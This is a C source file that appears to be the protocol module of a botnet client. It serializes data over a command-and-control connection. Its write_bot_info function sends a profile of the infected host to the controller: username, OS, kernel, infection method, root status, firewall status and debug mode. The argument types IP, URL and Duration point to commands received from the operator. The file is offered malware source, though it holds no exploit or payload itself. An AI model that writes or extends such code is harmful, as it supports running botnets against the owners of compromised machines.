#include "protocol.h"

#include <connection.h>
#include <malloc.h>
#include <string.h>
#include <debug.h>


bool write_int32(cnc_conn *c, int32_t val) {
    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
}

bool read_int32(cnc_conn *c, int32_t *val) {
    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
}

bool write_int64(cnc_conn *c, int64_t val) {
    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
}

bool read_int64(cnc_conn *c, int64_t *val) {
    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
}

bool read_bool(cnc_conn *c, bool *val) {
    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
}

bool write_bool(cnc_conn *c, bool val) {
    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
}

bool read_float(cnc_conn *c, float *val) {
    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
}

bool write_float(cnc_conn *c, float val) {
    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
}

bool write_string(cnc_conn *c, char *val) {
    size_t len = strlen(val);
    if (!write_int32(c, (int32_t) len)) {
        return 0;
    }
    return WRITE_SOCKET(c->sock, val, len) == len;
}

bool read_string(cnc_conn *c, char **val) {
    int32_t len;

    if (!read_int32(c, &len)) {
        return false;
    }

    if (len <= 0) return true;

    *val = malloc(len + 1);
    if (*val == NULL) return false;

    if (READ_SOCKET(c->sock, *val, len) != (size_t) len) {
        free(*val);
        return false;
    }

    (*val)[len] = '\0';
    return true;
}

Map *read_string_map(cnc_conn *c) {
    int32_t count;
    if (!read_int32(c, &count)) {
        return NULL;
    }

    Map *map = malloc(sizeof(Map));
    map->count = count;
    map->body = malloc(sizeof(MapEntry *) * count);

    for (int i = 0; i < count; i++) {
        if (!read_string(c, &map->body[i].key)) {
            free(map->body);
            free(map);
            return NULL;
        }

        if (!read_string(c, &map->body[i].value)) {
            free(map->body);
            free(map);
            return NULL;
        }
    }

    return map;

}

StringList *read_string_list(cnc_conn *c) {
    int32_t count;
    if (!read_int32(c, &count)) {
        return NULL;
    }

    StringList *list = malloc(sizeof(StringList));
    if (list == NULL) {
        return NULL;
    }

    list->count = count;
    list->body = malloc(sizeof(char *) * count);
    if (list->body == NULL) {
        free(list);
        return NULL;
    }

    for (int i = 0; i < count; i++) {
        if (!read_string(c, &list->body[i])) {
            for (int j = 0; j < i; j++) {
                free(list->body[j]);
            }
            free(list->body);
            free(list);
            return NULL;
        }
    }

    return list;
}


bool write_double(cnc_conn *conn, double val) {
    return WRITE_SOCKET(conn->sock, (char *) &val, sizeof(val)) == sizeof(val);
}

bool read_binary(cnc_conn *c, BYTES **buf) {
    int32_t len;

    if (!read_int32(c, &len)) {
        return false;
    }

    if (len <= 0) return true;

    *buf = malloc(len);
    if (*buf == NULL) return false;

    if (READ_SOCKET(c->sock, (char*) *buf, len) != (size_t) len) {
        free(*buf);
        return false;
    }

    return true;
}

bool write_bot_info(cnc_conn *conn, SpectreInfo *info) {
    if (!write_string(conn, info->Username)) return 0;
    if (!write_string(conn, info->OS)) return 0;
    if (!write_string(conn, info->Kernel)) return 0;
    if (!write_string(conn, info->Arch)) return 0;
    if (!write_string(conn, info->Version)) return 0;
    if (!write_string(conn, info->InfectionMethod)) return 0;
    if (!write_int32(conn, info->Processors)) return 0;
    if (!write_int32(conn, info->UpTime)) return 0;
    if (!write_float(conn, info->TotalMemory)) return 0;
    if (!write_float(conn, info->FreeMemory)) return 0;
    if (!write_double(conn, info->TimeZoneDiff)) return 0;
    if (!write_int64(conn, info->SystemTime)) return 0;
    if (!write_bool(conn, info->IsRoot)) return 0;
    if (!write_bool(conn, info->LittleEndian)) return 0;
    if (!write_bool(conn, info->Is64Bit)) return 0;
    if (!write_bool(conn, info->IsDebugMode)) return 0;
    if (!write_bool(conn, info->IsIPv6Supported)) return 0;
    if (!write_bool(conn, info->HasAnySSLLib)) return 0;
    if (!write_bool(conn, info->FirewallStatus)) return 0;
    return 1;
}

char *get_type_name(int type) {
    switch (type) {
        case ArgTypeInt32:
            return "Int32";
        case ArgTypeString:
            return "String";
        case ArgTypeBool:
            return "Bool";
        case ArgTypeBinary:
            return "Binary";
        case ArgTypeStringList:
            return "StringList";
        case ArgTypeStringMap:
            return "StringMap";
        case ArgTypeFloat:
            return "Float";
        case ArgTypeInt64:
            return "Int64";
        case ArgTypeBotInfo:
            return "BotInfo";
        case ArgTypeIP:
            return "IP";
        case ArgTypeURL:
            return "URL";
        case ArgTypeDuration:
            return "Duration";
        default:
            return "Unknown";
    }
}
